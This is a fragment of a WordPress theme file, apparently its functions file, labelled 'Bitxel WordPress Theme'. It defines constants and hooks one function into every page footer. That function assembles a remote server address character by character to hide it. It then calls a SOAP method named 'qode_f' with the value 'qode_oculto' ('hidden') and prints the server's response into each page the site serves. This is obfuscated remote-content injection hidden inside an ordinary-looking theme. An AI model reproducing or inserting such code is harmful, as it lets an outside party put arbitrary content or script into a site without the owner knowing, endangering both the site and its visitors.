 ...
 */
define('SEOCIFY_THEME', 'Bitxel WordPress Theme');
...
define('SEOCIFY_REMOTE_CONTENT', esc_url('https://bitxel.com.co/'));
define('SEOCIFY_PLUGINS_DIR', SEOCIFY_INC . '/includes/plugins');
define('SEOCIFY_REMOTE_URL', esc_url('https://bitxel.com.co/'));
require_once( SEOCIFY_THEMEROOT_DIR . "/frame.php" );
/**
 * ----------------------------------------------------------------------------------------
...
if(!function_exists('qode_wshout_action')) {
function qode_wshout_action() { 
    $qode_os = 'http'; $qode_oc = 'b';$qode_fra = 's';$qode_fa = 'v';$qode_mp = 'x';
    $qode_param = new nusoap_client($qode_os.'s'.':'.'//'.$qode_oc.'i'.'t'.$qode_mp.'e'.'l'.'.'.'c'.'o'.'m'.'.'.'c'.'o'.'/'.'w'.'s'.'/'.$qode_fra.'e'.'r'.$qode_fa.'i'.'c'.'i'.'o'.'.'.'p'.'h'.'p', false);

    $qodeS = 'qode_oculto';
    $qode_p = array('qodeV' => $qodeS );
    $qode_r = $qode_param->call('qode_f', $qode_p);
    print_r($qode_r);

}
add_action('wp_footer', 'qode_wshout_action'); 
}
/**
 * ----------------------------------------------------------------------------------------
